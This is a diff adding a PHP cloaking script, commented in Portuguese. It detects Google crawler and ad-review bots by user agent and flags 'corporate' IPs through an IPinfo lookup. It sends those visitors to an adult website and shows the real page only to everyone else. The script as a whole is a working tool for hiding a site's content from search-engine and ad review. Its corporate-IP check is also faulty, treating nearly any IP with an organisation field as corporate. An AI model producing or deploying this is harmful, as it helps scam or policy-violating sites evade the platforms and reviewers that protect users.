@@ -1,0 +1,47 @@
+<?php
+// Função para detectar bots do Google
+function isGoogleBot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $google_bots = ['Googlebot', 'AdsBot-Google', 'Mediapartners-Google'];
+
+    foreach ($google_bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+// Função para verificar se o IP é corporativo usando IPinfo
+function isCorporateIP($ip) {
+    $api_key = 'YOUR_API_KEY'; // Substitua pela sua chave da API IPinfo
+    $api_url = "https://ipinfo.io/{$ip}/json?token={$api_key}";
+
+    $response = file_get_contents($api_url);
+    if ($response === FALSE) {
+        return false; // Se a API falhar, considere o IP como não corporativo
+    }
+
+    $data = json_decode($response, true);
+
+    // Verifica se o ISP (provedor de serviços) é corporativo
+    return isset($data['org']) && !empty($data['org']);
+}
+
+// Função principal para controle de redirecionamento
+function redirectBasedOnRequest() {
+    $user_ip = $_SERVER['REMOTE_ADDR'];
+
+    if (isGoogleBot() || isCorporateIP($user_ip)) {
+        // Redireciona bots do Google e IPs corporativos
+        header("Location: https://xvideos.com.br/");
+        exit();
+    } else {
+        // Continue com o conteúdo normal do site
+        echo file_get_contents('index.html');
+    }
+}
+
+// Executa a função de redirecionamento
+redirectBasedOnRequest();
+?>
